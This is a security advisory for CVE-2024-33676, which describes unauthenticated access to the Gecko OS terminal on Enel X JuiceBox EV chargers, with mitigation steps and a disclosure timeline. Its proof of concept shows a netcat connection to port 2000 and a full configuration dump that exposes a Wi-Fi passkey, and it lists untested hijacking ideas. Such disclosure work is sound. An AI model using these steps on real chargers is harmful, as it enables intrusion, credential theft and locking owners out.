# CVE-2024-33676
Weak authentication and authorization on Enel X JuiceBox Level 2 EV charger enables access to operating system functions and parameters.

### Description
Users on the local EV charger WLAN network can extract PII, change settings, and manipulate the operating system file system. 
This is done by accessing the functions on a local Gecko OS interface on port 2000.

This information was presented on July 26, 2025 at BSides Albuquerque. The slides are 
[here](https://dersec.io/reports/BSidesABQ-Johnson-2025-7-26.pdf). 

## Product Details
Affected Vendor: Enel X Way
Affected Product: JuiceBox Level 2 Charger

Footprint: Enel X Way (subsidiary of Italian utility and energy conglomerate) EV chargers
* 25,000 JuiceBox commercial chargers (shopping malls, multifamily parking garages, etc.)
* 100,000 residential JuiceBox chargers in North America

Affected Versions:
* EMWERK-JB201-1.0.46, Gecko_OS-STANDARD-4.2.7-11064, WGM160P
* EMWERK-JB201_OCPP_EZVOL-0.0.106, Gecko_OS-STANDARD-4.2.7-11064, WGM160P
* EMWERK-JB201_OCPP_VOLTI-0.0.111, Gecko_OS-STANDARD-4.2.7-11064, WGM160P

## Impact 
Abusing JuiceBox Level 2 Charger [Gecko OS programming interface](https://docs.silabs.com/gecko-os/4/standard/4.2/cmd/commands):
* Reboot or shutdown charger
* Enable/disable services
* Change remote terminal and website credentials (i.e., update password to lock out owner)
* Upload and download files using the http functionality
* Read and modify the Wi-Fi password allowing access to HAN/WLAN or ability to knock EV charger off the local Wi-Fi (e.g., no updates, no app access)
* Adjust serial connections to sensors/actuators via I2C and GPIO configurations - safety concern?
* Manipulate OCPP settings or falsify measurement information
* Identify other Wi-Fi APs in the area
* Discloses the location of the EV charger, e.g., using wigle.net and the BSSID (privacy risk)
* Deface or disable the local website
* Potentially lock legitimate users out of their system

## CVSS
Suggested CVSS 4.0: 9.3 / Critical
* Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:L/R:U

## Mitigation
Option 1: Configure a remote terminal password
```
> set re w R3411yG00dEVCh4rg3rPa@@word
> save
```

Option 2: Disable with remote_terminal.enabled parameter
```
> set re e false
> save
```

NOTE: It appears the local website uses this command interface to populate it's
information, so modifying these settings will likely make the local web service
inoperable, e.g., `gecko-os.js` uses `GET http://setup.com/command/get%20all`. 

## Not-so-coordinated Disclosure

### Timeline

* **2023-06-30** - Created VINCE Report. Attempted to contact Enel X via email, website, and LinkedIn.
* **2023-06-30** - Notified US co-op of exposed devices. 
* **2023-11-30** - CERT/CC unable to contact Enel X, says "At this point, I think it's best to apply for a CVE and go public."
* **2024-4-25** - MITRE assigns CVE-2024-33676. 
* **2024-10-11** - Enel X Way announces it’s shutting down its North American charging business.  
* **2025-1-7** - VoltiE Group and partners acquire Enel X North America.
* **2025-7-26** - Researcher discloses vulnerability at BSides Albuquerque.

### Reporter 
Jay Johnson at DER Security

(With a special thanks to Brian Wright at Sandia National Laboratories for support with this research.)

## POC
If on the network with the EV Charger, an adversary can netcat to port 2000 and then interact with the equipment 
using the [Gecko OS API commands](https://docs.silabs.com/gecko-os/4/standard/latest/cmd/commands).

For example, getting the Wi-Fi password, networking information, and other sensative information can be accomplished 
with `get all`. 

```
$ nc 192.168.10.30 2000
EMWERK-JB201-1.0.46, Gecko_OS-STANDARD-4.2.7-11064, WGM160P
> get all
get all
app.debug.auto_run: 1
app.debug.ignore_settings: 0
app.info:
SDK version : 11064
Name : JBox_BT_Final.app
Size : 274852
Running : 1
broadcast.data: mac,bssid,channel,ip,ssid,rssi,remote_terminal_port,time,version,uuid
broadcast.http.host:
broadcast.interface: default
broadcast.interval: 10
broadcast.udp.ip: 255.255.255.255
broadcast.udp.local_port: 55555
broadcast.udp.remote_port: 55555
bus.command.read_timeout: 250
bus.command.rx_bufsize: 4096
bus.command.write_check_enabled: 0
bus.command.write_timeout: 25000
bus.data_bus: uart0
bus.log_bus: uart0
bus.mode: command
bus.stream.cmd_gpio: -1
bus.stream.cmd_seq: $$$
bus.stream.flush_count: 1460
bus.stream.flush_time: 20
bus.stream.flush_time_reset: 0
dfu.logs_enabled: 1
dfu.status: 0
dms.auto_start_enabled: 0
dms.bundle_id: 5fed5727-e67a-4a58-a0e0-e5da68e7f3fe
dms.cmd.enabled: 0
dms.connection.host: dfu.zentri.com
dms.connection.port: 443
dms.connection.timeout: 20
dms.interface: wlan
dms.product_id: ab92e1d2-632a-4939-afea-160d6beaf65d
dms.provision.status: 3
dms.telemetry.adc_mask: 0x0000
dms.telemetry.data_mask: 0x03FF
dms.telemetry.gpio_mask: 0x00000000
dms.telemetry.interval: 0
email.name_address: 0910042001280661727222696131
email.smtp.host:
email.smtp.password:
email.smtp.port: 587
email.smtp.username:
ethernet.auto_start.enabled: 0
ethernet.auto_start.retry_delay: 3
ethernet.dhcp.cache_enabled: 0
ethernet.dhcp.enabled: 1
ethernet.dhcp.hostname: gecko_os-#
ethernet.dhcp.timeout: 15
ethernet.link_detected_timeout: 7
ethernet.link_local.enabled: 0
ethernet.link_local.timeout: 20
ethernet.mac: 38:5C:FB:3A:B5:D2
ethernet.multicast.address: 0.0.0.0
ethernet.network.dns: 0.0.0.0
ethernet.network.gateway: 0.0.0.0
ethernet.network.ip: 0.0.0.0
ethernet.network.netmask: 0.0.0.0
ethernet.network.status: 0
ethernet.network.status_gpio: -1
ethernet.static.dns: 8.8.8.8
ethernet.static.gateway: 0.0.0.0
ethernet.static.ip: 0.0.0.0
ethernet.static.netmask: 255.255.255.0
gpio.alias:
! # Alias
gpio.init:
! # Description
gpio.sleep:
! # Description
gpio.usage:
! # Description
# 1 SPI1 CS
# 8 GPIO out
# 9 GPIO ipu
# 10 GPIO out
# 11 GPIO out
# 14 GPIO out
# 15 GPIO out
# 16 SPI16 CS
# 17 GPIO out
# 19 GPIO out
# 20 GPIO ipu
# 21 GPIO out
# 22 GPIO ood
# 23 UART0 TX
# 24 UART0 RX
# 25 GPIO out
# 26 GPIO out
http.client.retries: 3
http.client.retry_period: 1000
http.server.api_enabled: 1
http.server.auth_title:
http.server.cors_origin: 17EMOTORWERKS00030
http.server.denied_filename: webapp/unauthorized.html
http.server.enabled: 1
http.server.interface: default
http.server.keep_alive_enabled: 0
http.server.keep_alive_timeout: 300
http.server.max_clients: 6
http.server.notfound_filename:
http.server.password:
http.server.port: 80
http.server.root_filename: webapp/index.html
http.server.tls_cert:
http.server.tls_enabled: 0
http.server.tls_key:
http.server.tls_log_clients: 0
http.server.tls_peer_cert:
http.server.tls_verify_peer: 0
http.server.username: nmrx11.com.attz
http.server.ws_connected_gpio: -1
http.server.ws_data_gpio: -1
ioconn.control_gpio: -1
ioconn.enabled: 0
ioconn.local_port: 0
ioconn.protocol: tcp
ioconn.remote_host:
ioconn.remote_port: 0
ioconn.status_gpio: -1
mdns.enabled: 0
mdns.interface: default
mdns.name: gecko_os-#
mdns.service:
http - disabled
tcp - disabled
udp - disabled
remote_terminal - disabled
mdns.ttl: 300
network.arp.lock_enabled: 0
network.arp.table_size: 8
network.bridge.auto_start: 0
network.bridge.info: state: down
SSID: Gecko_OS-#
channel: 0
clients: 0
network.bridge.interface_1: none
network.bridge.interface_2: none
network.buffer.control_size: 8192
network.buffer.rxtx_ratio: 50
network.buffer.size: 61440
network.buffer.usage: RX:00,TX:05
network.default_interface: wlan
network.dns.timeout: 6000
network.tcp.delivery_type: normal
network.tls.ca_cert: godaddy_ca.pem
network.tls.ca_cert_verify_enabled: 1
network.tls.client_cert:
network.tls.client_key:
network.tls.handshake_timeout: 15
network.tls.version: 12
ntp.enabled: 1
ntp.interface: default
ntp.interval: 3600
ntp.server: pool.ntp.org
remote_terminal.enabled: 1
remote_terminal.interface: default
remote_terminal.password:
remote_terminal.port: 2000
remote_terminal.timeout: 60
setup.auto.cmd:
setup.gpio.cmd: setup_web
setup.gpio.control_gpio: -1
setup.gpio.level: 1
setup.gpio.mode: gpio
setup.web.captive_portal_enabled: 0
setup.web.client_list: ! Connected: 0
setup.web.idle_timeout: 600
setup.web.passkey:
setup.web.root_filename: webapp/index.html
setup.web.ssid: JuiceNet-#
setup.web.url: setup.com,www.setup.com,connectivitycheck.gstatic…
softap.auto_start: 0
softap.captive_portal_enabled: 1
softap.channel: 0
softap.client_list: ! Connected: 0
softap.dhcp_server.enabled: 1
softap.dhcp_server.lease_time: 86400
softap.dns_server.enabled: 1
softap.dns_server.url: silabs.com,www.silabs.com
softap.hide_ssid: 0
softap.idle_timeout: 7
softap.info: state: down
SSID: Gecko_OS-#
channel: 0
clients: 0
softap.mac: F4:B3:B1:8A:56:C2
softap.mac_filter.enabled: 0
softap.mac_filter.info:
MAC Addresses:
softap.mac_filter.mode: whitelist
softap.max_clients: 4
softap.passkey:
softap.rssi_average: 0
softap.ssid: Gecko_OS-#
softap.static.gateway: 0.0.0.0
softap.static.ip: 10.10.10.1
softap.static.netmask: 255.255.255.240
softap.tx_power: auto
spi.master.active_gpio: -1
spi.master.active_level: 1
stream.auto_close: 1
system.activity.gpio: none
system.activity.gpio_level: 1
system.adc.vref: 3300
system.bflash.cs_gpio: -1
system.bflash.port: spi1
system.bootloader.fsb_version: 1.7.0
system.bootloader.ssb_version: 1.7.3
system.build_number: 231addee2
system.cmd.aux_bus: 0
system.cmd.buffered: 0
system.cmd.echo: 1
system.cmd.gpio: -1
system.cmd.header_enabled: 0
system.cmd.prompt_enabled: 1
system.cmd.timestamp: none
system.debug.coredump_enabled: 0
system.factory_reset.gpio: 16
system.factory_reset.level: 0
system.hfxo.enabled: 0
system.hfxo.status: 0
system.indicator.gpio: network:-1, softap:-1, wlan:-1, ethernet:-1
system.indicator.state: network:fast_blink|medium_blink|slow_blink, softap:static_off|fast_blink|medium_blink|slow_blink, wlan:static_off|fast_blink|medium_blink|slow_blink, ethernet:static_off|fast_blink|medium_blink|slow_blink
system.interface.ethernet_enabled: 0
system.interface.wifi_enabled: 1
system.memory.usage: 16
system.msg:
initialized - [@tReady]
stream_closed - [@tClosed: @c]
stream_failed - [@tOpen failed]
stream_opened - [@tOpened: @c]
stream_opening - [@tOpening: @h]
shutdown - [@tShutdown]
wlan_failed - [@tJoin failed]
wlan_joined - [@tAssociated]
wlan_joining - [@tAssociating to @s]
wlan_leave - [@tDisassociated]
softap_joined - [@t@m associated]
softap_leave - [@t@m disassociated]
ethernet_starting - [@tEthernet Starting]
ethernet_started - [@tEthernet Started]
ethernet_stopped - [@tEthernet Stopped]
ethernet_failed - [@tEthernet Failed]
system.oob.event_mask: 0x0000
system.oob.gpio: -1
system.oob.gpio_level: 1
system.oob.rising_edge_mask: 0x0000
system.oob.status: 0x0000
system.powersave.idle_timeout: 250
system.powersave.mode: 1
system.powersave.wakeup_gpio_level_mask: 0x00000000
system.powersave.wakeup_gpio_mask: 0x00000000
system.print_level: async_sys
system.safemode.console_timeout: 10
system.safemode.disabled: 0
system.safemode.ota_auto_retry: 1
system.safemode.sleep_timeout: 0
system.safemode.status: 0
system.shutdown.wakeup_gpio_level_mask: 0x00000000
system.shutdown.wakeup_gpio_mask: 0x00000000
system.shutdown.wakeup_timeout: 0
system.uuid: EADE2FF34483EEDC048C3224385CFBFFFE3AB5D2
system.variable_lock: 0x00
system.version: EMWERK-JB201-1.0.46, Gecko_OS-STANDARD-4.2.7-11064, WGM160P
tcp.client.auto_interface: default
tcp.client.auto_retries: 0
tcp.client.auto_start: 0
tcp.client.connect_timeout: 4000
tcp.client.local_port: 0
tcp.client.remote_host:
tcp.client.remote_port: 3000
tcp.client.retries: 1
tcp.client.retry_period: 1000
tcp.client.tls_enabled: 0
tcp.keepalive.enabled: 0
tcp.keepalive.initial_timeout: 60
tcp.keepalive.retry_count: 5
tcp.keepalive.retry_timeout: 5
tcp.server.auto_interface: default
tcp.server.auto_start: 0
tcp.server.connected_gpio: -1
tcp.server.data_gpio: -1
tcp.server.idle_timeout: 60
tcp.server.max_clients: 8
tcp.server.port: 3000
tcp.server.tls_cert:
tcp.server.tls_enabled: 0
tcp.server.tls_key:
tcp.server.tls_peer_cert:
tcp.server.tls_verify_peer: 0
time.last_set: 41
time.rtc: 1687816798
time.uptime: 197
time.zone: 0
uart.baud: uart0:115200,uart1:115200
uart.data: uart0:8,uart1:8
uart.flow: uart0:off,uart1:off
uart.parity: uart0:none,uart1:none
uart.powersave.mode: uart0:0,uart1:0
uart.stop: uart0:1,uart1:1
udp.client.auto_interface: default
udp.client.auto_retry: 0
udp.client.auto_start: 0
udp.client.local_port: 0
udp.client.remote_host:
udp.client.remote_port: 3000
udp.server.auto_interface: default
udp.server.auto_start: 0
udp.server.data_gpio: -1
udp.server.lock_client: 0
udp.server.port: 3000
udp.server.remote_host:
udp.server.remote_port: 0
wlan.antenna.select: 1
wlan.auto_join.enabled: 0
wlan.auto_join.retries: 0
wlan.auto_join.retry_delay: 10
wlan.backoff: ! # Ch Attenuation (dbm)
# 0 1 0,0,0,0,0,0
# 1 2 0,0,0,0,0,0
# 2 3 0,0,0,0,0,0
# 3 4 0,0,0,0,0,0
# 4 5 0,0,0,0,0,0
# 5 6 0,0,0,0,0,0
# 6 7 0,0,0,0,0,0
# 7 8 0,0,0,0,0,0
# 8 9 0,0,0,0,0,0
# 9 10 0,0,0,0,0,0
# 10 11 0,0,0,0,0,0
# 11 12 0,0,0,0,0,0
# 12 13 0,0,0,0,0,0
# 13 14 0,0,0,0,0,0
wlan.bssid: 00:00:00:00:00:00
wlan.coex.mode: 0
wlan.dhcp.cache_enabled: 0
wlan.dhcp.enabled: 1
wlan.dhcp.hostname: gecko_os-#
wlan.dhcp.timeout: 15
wlan.hide_passkey: 0
wlan.info: state: up
SSID: SaulsGWiFi
BSSID: 00:C0:<<REDACTED>>
channel: 6
datarate: 65.0
wlan.join.result: 1
wlan.join.retries: 3
wlan.join.timeout: 7000
wlan.link_local.enabled: 0
wlan.link_local.timeout: 20
wlan.mac: F4:B3:B1:8A:56:C1
wlan.multicast.address: 0.0.0.0
wlan.network.dns: 192.168.10.1
wlan.network.gateway: 192.168.10.1
wlan.network.ip: 192.168.10.30
wlan.network.netmask: 255.255.255.0
wlan.network.status: 2
wlan.network.status_gpio: -1
wlan.passkey: Iamtheonewhoknocks
wlan.powersave.listen_interval: 0
wlan.powersave.mode: 0
wlan.rate.protocol: auto
wlan.rate.transmit: auto
wlan.roam.threshold: -99
wlan.rssi_average: 0
wlan.scan.active_dwell: 75
wlan.scan.channel_mask: 0x07FF
wlan.scan.home_dwell: 50
wlan.scan.num_probes: 3
wlan.scan.passive_dwell: 110
wlan.scan.retries: 3
wlan.scan.type: active
wlan.security: Auto
wlan.ssid: SaulsGWiFi
wlan.static.dns: 8.8.8.8
wlan.static.gateway: 0.0.0.0
wlan.static.ip: 0.0.0.0
wlan.static.netmask: 0.0.0.0
wlan.tx_power: auto
```

Reading the GPIO configuration. 
![GPIO](./img/i2c.png)

Reading the OCPP config. 
![OCPP](/img/ocpp_config.png)

Using the [HTTP server](http_server.py), much of the file system can be transferred from the device.  
Fortunately, it is not possible to read binary data using `stream_read` or transfer the 
kernal or .app file via `http_upload`. 

## Possible Future Pen Testing Work
The following were not explored, but could lead to additional vulnerabilities: 
* Download and reverse app/kernel.
* Modify app or kernel to add new functionality and/or executing arbitrary code on device.
* Hijack device by reassigning the equipment using the Zentri Device Management Service. See `dms_claim` function. 
* Changing DNS address to direct traffic to malicious OCPP CSMS or firmware server.

## Contact
Please contact me with any corrections/edits/updates. 